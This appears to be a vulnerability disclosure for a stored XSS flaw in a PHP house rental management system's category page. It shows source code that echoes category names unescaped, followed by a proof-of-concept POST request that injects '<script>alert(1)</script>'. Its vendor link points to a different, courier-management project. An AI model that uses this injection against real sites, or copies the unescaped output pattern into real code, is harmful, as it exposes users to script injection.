#### BUG_AUTHOR：tangling

# House Rental Management system - Storage XSS on (rental/manage_categories.php)

### Vendor Homepage:

https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html

### Version:V1.0

#### Tested on: PHP, Apache, MySQL

Affected Page:http://localhost/index.php?page=categories

#### Source code(rental/manage_categories.php【39】）

```
27        <tbody>
28         <?php 
29         $i = 1;
30         $category = $conn->query("SELECT * FROM categories order by id asc");
31         while($row=$category->fetch_assoc()):
32         ?>
33         <tr>
34          <td class="text-center"><?php echo $i++ ?></td>
35          <td class="">
36           <p><?php echo $row['name'] ?></p>
37          </td>
38          <td class="text-center">
39           <button class="btn btn-sm btn-primary edit_category" type="button" data-id="<?php echo $row['id'] ?>"  data-name="<?php echo $row['name'] ?>" >Edit</button>
40           <button class="btn btn-sm btn-danger delete_category" type="button" data-id="<?php echo $row['id'] ?>">Delete</button>
41          </td>
42         </tr>
43         <?php endwhile; ?>
44        </tbody>
45       </table>
46      </div>
47     </div>
48    </div>
49    <!-- Table Panel -->
50   </div>
51  </div>
```



#### POC:

```
POST /ajax.php?action=save_category HTTP/1.1
Host: localhost
accept: */*
accept-language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
cache-control: no-cache
content-type: multipart/form-data; boundary=----WebKitFormBoundaryuRsUvl5QwYB9x9tV
pragma: no-cache
sec-ch-ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-dest: empty
sec-fetch-mode: cors
sec-fetch-site: same-origin
x-requested-with: XMLHttpRequest
referer: http://localhost/index.php?page=categories
referrer-policy: strict-origin-when-cross-origin
Content-Length: 238

------WebKitFormBoundaryuRsUvl5QwYB9x9tV
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryuRsUvl5QwYB9x9tV
Content-Disposition: form-data; name="name"

<script>alert(1)</script>

------WebKitFormBoundaryuRsUvl5QwYB9x9tV--


```





